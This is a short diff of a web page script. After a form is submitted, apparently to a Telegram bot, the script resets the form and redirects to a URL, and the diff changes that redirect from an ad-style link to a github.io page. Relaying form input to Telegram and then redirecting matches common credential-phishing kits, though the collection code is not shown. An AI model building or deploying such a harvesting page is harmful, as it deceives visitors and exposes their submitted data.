@@ -49,7 +49,7 @@ document.addEventListener("DOMContentLoaded", () => {
           form.reset();
 
           // Redirect after submission
-          window.location.href = "https://otieu.com/4/9831084"; // <<< change to any URL you want
+          window.location.href = "https://rrloaty.github.io/intelligent/lin.html"; // <<< change to any URL you want
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
